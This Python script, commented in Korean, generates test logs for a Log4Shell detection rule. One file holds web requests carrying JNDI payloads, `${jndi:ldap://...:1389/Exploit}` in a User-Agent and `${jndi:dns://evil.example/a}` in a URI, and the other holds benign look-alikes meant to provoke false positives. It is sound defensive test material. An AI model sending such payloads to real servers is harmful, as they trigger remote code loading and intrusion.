"""DET-005 배포 - Log4Shell(JNDI) 공격이 섞인 웹 로그 + 정상 로그 생성.

attack_log.jsonl: User-Agent/URI에 ${jndi:ldap://...} 페이로드가 실린 요청.
normal_log.jsonl: '${' 나 'jndi' 단어가 우연히 들어간 정상 요청(오탐 유발)만 — 정확한
${jndi: 시퀀스는 없어야 한다.
"""
import json
import time


def _evt(ua: str, uri: str, ts: float) -> dict:
    return {"source_type": "twin", "raw": {"user_agent": ua, "uri": uri}, "timestamp": ts}


def generate_attack_log(path: str) -> None:
    t0 = time.time()
    rows = [
        _evt("Mozilla/5.0", "/", t0),
        _evt("${jndi:ldap://198.51.100.9:1389/Exploit}", "/login", t0 + 1),   # Log4Shell in UA
        _evt("curl/7.68", "/api/search?q=${jndi:dns://evil.example/a}", t0 + 2),  # in URI
        _evt("Mozilla/5.0", "/products", t0 + 3),
    ]
    with open(path, "w") as f:
        for r in rows:
            f.write(json.dumps(r) + "\n")


def generate_normal_log(path: str) -> None:
    t0 = time.time()
    rows = [
        _evt("Mozilla/5.0", "/", t0),
        _evt("MyApp/1.0 ${build}", "/status", t0 + 1),          # '${' 있으나 jndi 아님
        _evt("Mozilla/5.0", "/blog/what-is-jndi-in-java", t0 + 2),  # 'jndi' 단어(정상 블로그)
        _evt("PostmanRuntime/7.29", "/api/health", t0 + 3),
        _evt("Mozilla/5.0", "/search?q=log4j+cve", t0 + 4),      # 관련 검색이지만 페이로드 아님
    ]
    with open(path, "w") as f:
        for r in rows:
            f.write(json.dumps(r) + "\n")


if __name__ == "__main__":
    generate_attack_log("attack_log.jsonl")
    generate_normal_log("normal_log.jsonl")
    print("생성 완료: attack_log.jsonl, normal_log.jsonl")
